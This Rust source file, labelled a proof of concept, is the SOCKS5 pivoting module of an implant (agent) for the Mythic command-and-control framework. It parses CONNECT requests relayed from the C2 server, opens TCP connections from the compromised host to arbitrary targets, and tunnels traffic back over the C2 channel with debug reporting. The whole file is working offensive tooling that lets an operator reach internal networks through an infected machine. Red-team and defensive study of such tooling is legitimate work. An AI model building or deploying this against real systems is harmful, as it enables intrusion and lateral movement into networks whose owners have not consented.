// POC by Gerar
use crate::agent::AgentTask;
use crate::mythic_continued;

use base64::{decode, encode};
use serde::{Deserialize, Serialize};
use serde_json::{json, Value};

use std::collections::HashMap;
use std::error::Error;
use std::net::{Ipv4Addr, Ipv6Addr, SocketAddr};
use std::sync::mpsc as std_mpsc;

use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::sync::mpsc as tokio_mpsc;
use tokio::time::{timeout, Duration};

#[derive(Debug, Deserialize)]
struct SocksTask {
    port: u16,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct WireMsg {
    server_id: String,
    data: String, // base64
    #[serde(default)]
    exit: bool,
}

/* -------------------------- Mythic debug helpers -------------------------- */

fn debug_to_mythic<T: Into<String>, U: Into<String>>(
    tx: &std_mpsc::Sender<Value>,
    task_id: &str,
    title: T,
    detail: U,
) {
    let _ = tx.send(mythic_continued!(task_id, title.into(), detail.into()));
}

fn hex_preview(data: &[u8], max: usize) -> String {
    use std::fmt::Write;
    let mut s = String::new();
    let take = data.len().min(max);
    for b in &data[..take] {
        let _ = write!(&mut s, "{:02x}", b);
    }
    if data.len() > max {
        s.push_str("…");
    }
    s
}

fn str_preview(s: &str, max: usize) -> String {
    let mut out = s.to_string();
    if out.len() > max {
        out.truncate(max);
        out.push('…');
    }
    out
}

/* ------------------------------- SOCKS utils ------------------------------ */

fn build_reply(rep: u8, bound: Option<SocketAddr>) -> Vec<u8> {
    let mut out = vec![0x05, rep, 0x00]; // VER, REP, RSV
    match bound {
        Some(SocketAddr::V4(v4)) => {
            out.push(0x01);
            out.extend_from_slice(&v4.ip().octets());
            out.extend_from_slice(&v4.port().to_be_bytes());
        }
        Some(SocketAddr::V6(v6)) => {
            out.push(0x04);
            out.extend_from_slice(&v6.ip().octets());
            out.extend_from_slice(&v6.port().to_be_bytes());
        }
        None => {
            out.push(0x01);
            out.extend_from_slice(&Ipv4Addr::UNSPECIFIED.octets());
            out.extend_from_slice(&0u16.to_be_bytes());
        }
    }
    out
}

fn send_data(
    tx: &std_mpsc::Sender<Value>,
    server_id: &str,
    data: &[u8],
    exit: bool,
) -> Result<(), Box<dyn Error>> {
    let packet = json!({
        "server_id": server_id,
        "data": encode(data),
        "exit": exit,
    });
    tx.send(packet)?;
    Ok(())
}

fn parse_connect(decoded: &[u8]) -> Result<(String, u16), Box<dyn Error>> {
    if decoded.len() < 10 {
        return Err("SOCKS5 request too short".into());
    }
    if decoded[0] != 0x05 {
        return Err("Unsupported SOCKS version".into());
    }
    if decoded[1] != 0x01 {
        return Err("SOCKS5 command not supported (only CONNECT)".into());
    }

    match decoded[3] {
        0x01 => {
            if decoded.len() < 10 {
                return Err("Malformed IPv4 CONNECT frame".into());
            }
            let ip = Ipv4Addr::new(decoded[4], decoded[5], decoded[6], decoded[7]);
            let port = u16::from_be_bytes([decoded[8], decoded[9]]);
            Ok((ip.to_string(), port))
        }
        0x03 => {
            let len = decoded[4] as usize;
            let need = 5 + len + 2;
            if decoded.len() < need {
                return Err("Malformed domain CONNECT frame".into());
            }
            let domain = std::str::from_utf8(&decoded[5..5 + len])?.to_string();
            let port = u16::from_be_bytes([decoded[5 + len], decoded[6 + len]]);
            Ok((domain, port))
        }
        0x04 => {
            let need = 4 + 16 + 2;
            if decoded.len() < need {
                return Err("Malformed IPv6 CONNECT frame".into());
            }
            let mut octets = [0u8; 16];
            octets.copy_from_slice(&decoded[4..20]);
            let ip = Ipv6Addr::from(octets);
            let port = u16::from_be_bytes([decoded[20], decoded[21]]);
            Ok((ip.to_string(), port))
        }
        _ => Err("Unsupported ATYP in SOCKS5 request".into()),
    }
}

/* ----------- Extract socks messages from continued_task.parameters --------- */


fn extract_socks_packet(msg: &Value) -> Result<Option<(String, bool, Value)>, Box<dyn Error>> {
    // Caso 1: top-level
    if let Some(sid) = msg.get("server_id").and_then(|v| v.as_str()) {
        let exit = msg.get("exit").and_then(|v| v.as_bool()).unwrap_or(false);
        return Ok(Some((sid.to_string(), exit, msg.clone())));
    }

    // Caso 2: `parameters` (independientemente de `command`)
    if let Some(params_val) = msg.get("parameters") {
        // Parsear string JSON o clonar objeto
        let mut inner: Value = match params_val {
            Value::String(s) => match serde_json::from_str::<Value>(s) {
                Ok(v) => v,
                Err(_) => return Ok(None),
            },
            v @ Value::Object(_) => v.clone(),
            _ => return Ok(None),
        };

        // Algunos backends meten el payload real bajo `message`
        if let Some(v) = inner.get("message") {
            if v.is_object() {
                inner = v.clone();
            }
        }

        // Detectar server_id
        if let Some(sid) = inner.get("server_id").and_then(|v| v.as_str()) {
            // `data` puede venir como `data` o `chunk_data`
            let data_b64 = inner
                .get("data")
                .or_else(|| inner.get("chunk_data"))
                .and_then(|v| v.as_str())
                .unwrap_or("");

            // `exit` puede venir como `exit` o `close`
            let exit = inner
                .get("exit")
                .and_then(|v| v.as_bool())
                .or_else(|| inner.get("close").and_then(|v| v.as_bool()))
                .unwrap_or(false);

            let normalized = json!({
                "server_id": sid,
                "data": data_b64,
                "exit": exit,
            });
            return Ok(Some((sid.to_string(), exit, normalized)));
        }

        // Si no hay `server_id`, no es tráfico SOCKS para nosotros
        return Ok(None);
    }

    Ok(None)
}


/* ----------------------------- Session handler ---------------------------- */

async fn handle_connection(
    parent_task_id: String,                     // for debug to Mythic
    server_id: String,                         // SOCKS session id from Mythic
    mut sess_rx: tokio_mpsc::UnboundedReceiver<Value>,
    tx_out: std_mpsc::Sender<Value>,
) -> Result<(), Box<dyn Error>> {
    debug_to_mythic(
        &tx_out,
        &parent_task_id,
        "SOCKS session starting",
        format!("server_id={server_id}"),
    );

    // Expect initial CONNECT frame (as a socks packet forwarded by dispatcher)
    let first = match sess_rx.recv().await {
        Some(v) => v,
        None => {
            debug_to_mythic(
                &tx_out,
                &parent_task_id,
                "SOCKS session aborted",
                format!("server_id={server_id}; reason=no-initial-frame"),
            );
            return Ok(());
        }
    };

    let decoded = match decode(first["data"].as_str().unwrap_or("")) {
        Ok(d) => d,
        Err(e) => {
            debug_to_mythic(
                &tx_out,
                &parent_task_id,
                "SOCKS initial decode failed",
                format!("server_id={server_id}; err={e}"),
            );
            let _ = send_data(&tx_out, &server_id, &build_reply(0x07, None), true);
            return Ok(());
        }
    };

    let (addr, port) = match parse_connect(&decoded) {
        Ok(v) => v,
        Err(e) => {
            debug_to_mythic(
                &tx_out,
                &parent_task_id,
                "SOCKS CONNECT parse failed",
                format!("server_id={server_id}; err={e} hex={}", hex_preview(&decoded, 64)),
            );
            let _ = send_data(&tx_out, &server_id, &build_reply(0x07, None), true);
            return Ok(());
        }
    };

    debug_to_mythic(
        &tx_out,
        &parent_task_id,
        "SOCKS connecting",
        format!("server_id={server_id}; target={addr}:{port}"),
    );

    // Connect to remote with timeout
    let remote = match timeout(Duration::from_secs(15), TcpStream::connect((addr.as_str(), port))).await {
        Ok(Ok(s)) => s,
        Ok(Err(e)) => {
            debug_to_mythic(
                &tx_out,
                &parent_task_id,
                "SOCKS connect failed",
                format!("server_id={server_id}; target={addr}:{port}; err={e}"),
            );
            let _ = send_data(&tx_out, &server_id, &build_reply(0x01, None), true);
            return Ok(());
        }
        Err(_) => {
            debug_to_mythic(
                &tx_out,
                &parent_task_id,
                "SOCKS connect timeout",
                format!("server_id={server_id}; target={addr}:{port}"),
            );
            let _ = send_data(&tx_out, &server_id, &build_reply(0x01, None), true);
            return Ok(());
        }
    };

    // Send success reply w/ bound address
    let bound = remote.local_addr().ok();
    let ok = build_reply(0x00, bound);
    send_data(&tx_out, &server_id, &ok, false)?;
    debug_to_mythic(
        &tx_out,
        &parent_task_id,
        "SOCKS connect ok",
        format!(
            "server_id={server_id}; target={addr}:{port}; bound={}",
            bound.map(|s| s.to_string()).unwrap_or_else(|| "unknown".into())
        ),
    );

    // Split into owned halves
    let (mut remote_r, mut remote_w) = remote.into_split();

    // Byte counters for final stats
    let bytes_up = std::sync::Arc::new(std::sync::atomic::AtomicU64::new(0));   // remote→Mythic
    let bytes_dn = std::sync::Arc::new(std::sync::atomic::AtomicU64::new(0));   // Mythic→remote

    // remote -> Mythic
    let tx_for_a2m = tx_out.clone();
    let sid_for_a2m = server_id.clone();
    let parent_for_a2m = parent_task_id.clone();
    let up_ctr = bytes_up.clone();
    let a2m = tokio::spawn(async move {
        let mut buf = vec![0u8; 16 * 1024];
        loop {
            match timeout(Duration::from_secs(300), remote_r.read(&mut buf)).await {
                Ok(Ok(0)) => {
                    debug_to_mythic(
                        &tx_for_a2m,
                        &parent_for_a2m,
                        "SOCKS upstream EOF",
                        format!("server_id={sid_for_a2m}"),
                    );
                    let _ = send_data(&tx_for_a2m, &sid_for_a2m, b"", true);
                    break;
                }
                Ok(Ok(n)) => {
                    if n > 0 {
                        up_ctr.fetch_add(n as u64, std::sync::atomic::Ordering::Relaxed);
                        let _ = send_data(&tx_for_a2m, &sid_for_a2m, &buf[..n], false);
                    }
                }
                Ok(Err(e)) => {
                    debug_to_mythic(
                        &tx_for_a2m,
                        &parent_for_a2m,
                        "SOCKS upstream read error",
                        format!("server_id={sid_for_a2m}; err={e}"),
                    );
                    let _ = send_data(&tx_for_a2m, &sid_for_a2m, b"", true);
                    break;
                }
                Err(_) => {
                    debug_to_mythic(
                        &tx_for_a2m,
                        &parent_for_a2m,
                        "SOCKS upstream idle timeout",
                        format!("server_id={sid_for_a2m}"),
                    );
                    let _ = send_data(&tx_for_a2m, &sid_for_a2m, b"", true);
                    break;
                }
            }
        }
    });

    // Mythic -> remote
    let tx_for_m2a = tx_out.clone();
    let sid_for_m2a = server_id.clone();
    let parent_for_m2a = parent_task_id.clone();
    let dn_ctr = bytes_dn.clone();
    let m2a = tokio::spawn(async move {
        while let Some(msg) = sess_rx.recv().await {
            // sess_rx already contains only socks packets for this session_id
            if msg["exit"].as_bool().unwrap_or(false) {
                debug_to_mythic(
                    &tx_for_m2a,
                    &parent_for_m2a,
                    "SOCKS downstream exit",
                    format!("server_id={sid_for_m2a}"),
                );
                let _ = AsyncWriteExt::shutdown(&mut remote_w).await;
                break;
            }

            match decode(msg["data"].as_str().unwrap_or("")) {
                Ok(data) => {
                    if data.is_empty() {
                        continue;
                    }
                    dn_ctr.fetch_add(data.len() as u64, std::sync::atomic::Ordering::Relaxed);
                    let _ = timeout(Duration::from_secs(60), remote_w.write_all(&data)).await;
                }
                Err(e) => {
                    debug_to_mythic(
                        &tx_for_m2a,
                        &parent_for_m2a,
                        "SOCKS downstream base64 decode error",
                        format!("server_id={sid_for_m2a}; err={e}"),
                    );
                }
            }
        }
        let _ = AsyncWriteExt::shutdown(&mut remote_w).await;
    });

    let _ = a2m.await;
    let _ = m2a.await;

    // Final stats
    debug_to_mythic(
        &tx_out,
        &parent_task_id,
        "SOCKS session closed",
        format!(
            "server_id={server_id}; bytes_up(remote→Mythic)={}; bytes_down(Mythic→remote)={}",
            bytes_up.load(std::sync::atomic::Ordering::Relaxed),
            bytes_dn.load(std::sync::atomic::Ordering::Relaxed),
        ),
    );

    Ok(())
}

/* ------------------------------- Entry point ------------------------------ */

pub fn handle_socks(
    tx: &std_mpsc::Sender<Value>,
    rx: std_mpsc::Receiver<Value>,
) -> Result<(), Box<dyn Error>> {
    // Primer mensaje: AgentTask
    let task_val = rx.recv()?;
    let task: AgentTask = serde_json::from_value(task_val)?;

    tx.send(mythic_continued!(
        task.id,
        "SOCKS handler active",
        "Dispatcher starting"
    ))?;

    // Puente std::mpsc -> tokio::mpsc
    let (bridge_tx, mut bridge_rx) = tokio_mpsc::unbounded_channel::<Value>();
    {
        let parent_id = task.id.clone();
        let tx_clone = tx.clone();
        std::thread::spawn(move || {
            debug_to_mythic(
                &tx_clone,
                &parent_id,
                "SOCKS bridge spawn",
                "blocking→async bridge started",
            );
            while let Ok(v) = rx.recv() {
                let _ = bridge_tx.send(v);
            }
            debug_to_mythic(
                &tx_clone,
                &parent_id,
                "SOCKS bridge ended",
                "blocking receiver closed",
            );
        });
    }

    // Runtime y dispatcher
    let rt = tokio::runtime::Runtime::new()?;
    rt.block_on(async {
        let mut sessions: HashMap<String, tokio_mpsc::UnboundedSender<Value>> = HashMap::new();
        let parent_task_id = task.id.clone();
        let mut non_socks_seen: u64 = 0;

        debug_to_mythic(
            &tx,
            &parent_task_id,
            "SOCKS dispatcher running",
            "awaiting messages from Mythic",
        );

        loop {
            let raw_msg = match bridge_rx.recv().await {
                Some(v) => v,
                None => break, // se cerró el puente
            };

            match extract_socks_packet(&raw_msg) {
                Ok(Some((server_id, exit, socks_msg))) => {
                    // Crear sesión si no existe y reenviar
                    let entry = sessions.entry(server_id.clone()).or_insert_with(|| {
                        let (sess_tx, sess_rx) = tokio_mpsc::unbounded_channel();
                        let sid = server_id.clone();
                        let tx_out = tx.clone();
                        let parent_id = parent_task_id.clone();

                        debug_to_mythic(
                            &tx_out,
                            &parent_id,
                            "SOCKS session spawn",
                            format!("server_id={sid}"),
                        );

                        tokio::spawn(async move {
                            if let Err(e) = handle_connection(parent_id, sid, sess_rx, tx_out).await
                            {
                                eprintln!("socks session ended with error: {e}");
                            }
                        });
                        sess_tx
                    });

                    let _ = entry.send(socks_msg);

                    if exit {
                        sessions.remove(&server_id);
                        debug_to_mythic(
                            &tx,
                            &parent_task_id,
                            "SOCKS dispatcher removed session",
                            format!("server_id={server_id}"),
                        );
                    }
                }

                // No-SOCKS (acks de Mythic, etc). Muestra muestra ocasional.
                Ok(None) => {
                    non_socks_seen += 1;
                    if non_socks_seen <= 5 || non_socks_seen % 100 == 0 {
                        // Resumen de claves top-level
                        let keys_top: Vec<String> = raw_msg
                            .as_object()
                            .map(|m| {
                                let mut v: Vec<String> = m.keys().cloned().collect();
                                v.sort();
                                v
                            })
                            .unwrap_or_default();

                        // Resumen de `parameters` sin closures anidados
                        let params_preview: String = if let Some(p) = raw_msg.get("parameters") {
                            match p {
                                Value::String(s) => {
                                    let s = s.trim();
                                    format!("str(len={}, starts_with_brace={})", s.len(), s.starts_with('{'))
                                }
                                Value::Object(o) => {
                                    let mut v: Vec<String> = o.keys().cloned().collect();
                                    v.sort();
                                    format!("obj(keys={:?})", v)
                                }
                                other => format!("{:?}", other),
                            }
                        } else {
                            "<none>".to_string()
                        };

                        debug_to_mythic(
                            &tx,
                            &parent_task_id,
                            "SOCKS skip sample",
                            format!(
                                "count={non_socks_seen}; keys_top={keys_top:?}; parameters={params_preview}"
                            ),
                        );
                    }
                }

                // Paquete inesperado
                Err(e) => {
                    let top_keys = raw_msg.as_object().map(|m| {
                        let mut v: Vec<String> = m.keys().cloned().collect();
                        v.sort();
                        v
                    });
                    debug_to_mythic(
                        &tx,
                        &parent_task_id,
                        "SOCKS parse error",
                        format!("err={e}; top_keys={top_keys:?}"),
                    );
                }
            } // end match
        } // end loop

        debug_to_mythic(
            &tx,
            &parent_task_id,
            "SOCKS dispatcher ended",
            "bridge_rx closed; dropping all sessions",
        );
        sessions.clear();
    }); // end block_on(async { .. })

    Ok(())
}



/// Back-compat for existing call site in tasking.rs
pub fn setup_socks(
    tx: &std_mpsc::Sender<Value>,
    rx: std_mpsc::Receiver<Value>,
) -> Result<(), Box<dyn Error>> {
    handle_socks(tx, rx)
}

